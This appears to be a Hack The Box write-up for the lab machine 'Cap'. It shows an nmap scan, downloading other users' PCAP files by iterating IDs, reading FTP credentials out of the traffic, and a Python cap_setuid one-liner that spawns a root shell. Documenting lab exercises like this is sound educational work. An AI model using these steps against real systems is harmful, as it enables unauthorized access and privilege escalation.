---
clayout: ctf
title: Cap
date: 2025-03-12
image: /ctf/hack-the-box/machines/cap/info-card.png
type: Hack The Box

ctf:
    - name: Cap
      link: https://app.hackthebox.com/machines/351
      thumbnail: /ctf/hack-the-box/machines/cap/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/351
          thumbnail: /ctf/hack-the-box/machines/cap/pwned.png
---

## Enumeration

### Nmap Scan

We begin by running an Nmap scan to identify open ports and services on the target machine:

```bash
nmap -sC -sV -v -p- -oN cap.nmap 10.10.10.245
```

#### Scan Results:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```

From the results, we identified three open ports:

- **Port 21:** FTP (vsftpd 3.0.3)
- **Port 22:** SSH (OpenSSH 8.2p1)
- **Port 80:** HTTP (Gunicorn web server)

## Web Enumeration

### Exploring HTTP - Port 80

Visiting `http://10.10.10.245`, we see a **Security Dashboard**:

![Security Dashboard](/ctf/hack-the-box/machines/cap/security-dashboard.png)

One of the options, **Security Snapshot (5 Second PCAP + Analysis),** leads to a **Capture Analysis** page:

![Capture Analysis](/ctf/hack-the-box/machines/cap/capture-analysis.png)

This page allows us to download PCAP files. The URLs follow the pattern `/data/<id>`. By iterating over different values, we retrieve multiple PCAP files for analysis.

### Extracting Credentials from PCAP

Using Wireshark to analyze the PCAP files, we find FTP credentials in `/data/0`:

```plaintext
36   4.126500   192.168.196.1   192.168.196.16   FTP   69   Request: USER nathan
40   5.424998   192.168.196.1   192.168.196.16   FTP   78   Request: PASS ***************
```

We now have valid FTP credentials for `nathan`.

## Gaining Access

### FTP Login & User Flag

Using the extracted credentials, we log in to the FTP server:

```bash
ftp 10.10.10.245
Name (10.10.10.245:nathan): nathan
Password: ***************
```

We list the available files and find the user flag:

```bash
ftp> ls -al
-r--------    1 1001     1001           33 Mar 12 18:26 user.txt
ftp> get user.txt
```

Using the same credentials, we can log in via SSH:

```bash
ssh nathan@10.10.10.245
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

## Privilege Escalation

### Checking Capabilities

Using `getcap`, we identify a privilege escalation vector:

```bash
getcap -r / 2>/dev/null
```

```plaintext
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The `cap_setuid` capability allows the Python binary to change its effective user ID, providing a path to escalate privileges.

### Exploiting Python Capabilities

We use the following command to elevate our privileges:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

We successfully escalate to root.
